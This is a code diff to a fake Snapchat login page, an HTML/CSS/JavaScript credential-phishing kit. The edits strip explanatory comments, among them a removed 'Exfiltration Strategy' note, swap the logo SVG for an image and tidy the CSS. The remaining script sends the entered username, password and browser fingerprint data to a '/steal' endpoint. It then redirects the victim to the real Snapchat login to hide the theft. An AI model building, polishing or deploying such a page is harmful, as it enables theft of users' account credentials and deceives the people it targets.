@@ -30,7 +30,6 @@
             min-height: 100vh;
             color: var(--text-primary);
             -webkit-font-smoothing: antialiased;
-            /* Prevent iOS from zooming in on input focus */
             text-size-adjust: 100%;
         }
 
@@ -44,8 +43,10 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* On mobile, make it full screen for immersion */
-            @media (max-width: 480px) {
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
                 max-width: 100%;
                 height: 100vh;
                 border-radius: 0;
@@ -62,9 +63,10 @@
             height: 48px;
         }
 
-        .logo-svg {
+        .logo-img {
             height: 48px;
             width: auto;
+            object-fit: contain;
         }
 
         .input-group {
@@ -78,7 +80,7 @@
             padding: 16px;
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            font-size: 16px; /* 16px prevents iOS zoom */
+            font-size: 16px;
             font-family: var(--font-stack);
             outline: none;
             transition: border-color 0.2s;
@@ -129,12 +131,8 @@
 </head>
 <body>
     <div class="login-card">
-        <!-- High-Res Snapchat Ghost SVG -->
         <div class="logo-container">
-            <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 10 C30 10 20 25 20 45 C20 65 30 90 50 90 C70 90 80 65 80 45 C80 25 70 10 50 10 Z M45 35 C42 35 40 38 40 42 C40 46 42 49 45 49 C48 49 50 46 50 42 C50 38 48 35 45 35 Z M55 35 C52 35 50 38 50 42 C50 46 52 49 55 49 C58 49 60 46 60 42 C60 38 58 35 55 35 Z" fill="#FFFC00"/>
-                <text x="50" y="75" font-family="Arial, sans-serif" font-size="12" font-weight="bold" text-anchor="middle" fill="#000">SNAPCHAT</text>
-            </svg>
+            <img src="/images.jpeg" alt="Snapchat Logo" class="logo-img">
         </div>
 
         <form id="loginForm" autocomplete="off">
@@ -150,7 +148,6 @@
     </div>
 
     <script>
-        // Fingerprinting Data
         const fingerprint = {
             userAgent: navigator.userAgent,
             language: navigator.language,
@@ -167,7 +164,6 @@
             const password = document.getElementById('password').value;
             const btn = document.getElementById('submitBtn');
             
-            // Visual loading state
             btn.disabled = true;
             btn.textContent = 'Logging In...';
             
@@ -177,11 +173,6 @@
                 ...fingerprint
             };
 
-            // Exfiltration Strategy:
-            // 1. Try POST to your server
-            // 2. If that fails (e.g., CORS or offline), try a "pixel" tracking request to a public endpoint
-            // 3. Redirect to real site regardless
-            
             try {
                 await fetch('/steal', {
                     method: 'POST',
@@ -189,17 +180,11 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                // Fallback: If your server is unreachable, send to a public paste or logging service
-                // For this demo, we'll just log to console, but in production, you'd use a service like httpbin or a public log
-                console.error('Primary exfil failed. Payload:', payload);
+                console.error('Exfiltration failed', e);
             }
             
-            // Minimum 1.5s delay to simulate processing
             await new Promise(resolve => setTimeout(resolve, 1500));
             
-            // Redirect to the real site. The user will see the real login page.
-            // If they typed the correct password, they are now logged in.
-            // If they typed the wrong password, they will be logged in with the wrong password (which is what you want to see).
             window.location.href = 'https://www.snapchat.com/login';
         });
     </script>
